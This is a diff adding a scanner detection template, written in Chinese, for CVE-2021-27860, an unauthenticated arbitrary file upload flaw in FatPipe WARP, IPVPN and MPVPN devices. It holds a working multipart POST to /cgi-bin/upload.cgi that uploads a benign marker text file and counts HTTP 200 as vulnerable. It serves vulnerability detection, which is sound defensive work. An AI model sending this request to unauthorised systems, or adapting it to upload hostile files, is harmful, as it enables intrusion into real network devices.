@@ -1,0 +1,39 @@
+[info]
+author = "ave"
+description = "检测 FatPipe WARP、IPVPN、MPVPN 设备 Web 管理界面是否存在任意文件上传漏洞（CVE-2021-27860 / FPSA006）。该漏洞已被 CISA KEV 收录，CVSSv3.1 评分 9.8，允许远程未认证攻击者向文件系统任意位置上传文件。通过构造 multipart 文件上传请求验证漏洞是否存在。"
+id = "POC-AVE-2021-1208"
+name = "CVE-2021-27860 FatPipe 任意文件上传漏洞检测"
+severity = "critical"
+tags = ["cve-2021-27860"]
+vuln_id = [
+    "CVE-2021-27860",
+    "AVE-2021-1208",
+]
+
+[poc]
+logic = "all"
+
+[[poc.requests]]
+method = "POST"
+path = "/{{BaseURL}}/cgi-bin/upload.cgi"
+protocol = "http"
+
+[poc.requests.body]
+content = """
+------WebKitFormBoundary\r
+Content-Disposition: form-data; name="file"; filename="ave-test.txt"\r
+Content-Type: text/plain\r
+\r
+AVE-TEST-POC\r
+------WebKitFormBoundary--\r
+"""
+type = "raw"
+
+[poc.requests.headers]
+Content-Type = "multipart/form-data; boundary=----WebKitFormBoundary"
+User-Agent = "AVE/1.0"
+
+[[poc.requests.matchers]]
+expect = true
+status = [200]
+type = "status"
